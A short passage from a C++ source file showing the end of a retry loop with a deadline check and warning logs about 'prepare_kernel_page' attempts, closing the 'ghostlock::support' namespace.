        (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
      pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
      break;
    }
    pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
               max_attempts, ms_since(&t_good));
  }
  return 0;
}

}  // namespace ghostlock::support
